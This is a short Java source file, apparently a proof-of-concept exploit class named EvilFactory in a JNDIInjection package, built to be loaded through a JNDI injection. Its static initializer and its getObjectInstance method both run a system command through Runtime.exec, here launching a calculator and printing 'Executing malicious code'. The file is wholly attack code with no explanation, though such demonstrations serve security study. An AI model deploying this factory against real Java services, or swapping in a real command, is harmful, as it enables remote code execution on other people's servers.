package JNDIInjection;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class EvilFactory implements ObjectFactory {
    static {
        // 1.
        try{
            Runtime.getRuntime().exec("/usr/bin/gnome-calculator");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        try {
            // 2.
            System.out.println("EvilFactory: Executing malicious code...");
            Runtime.getRuntime().exec("/usr/bin/gnome-calculator");
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        return null;
    }
}
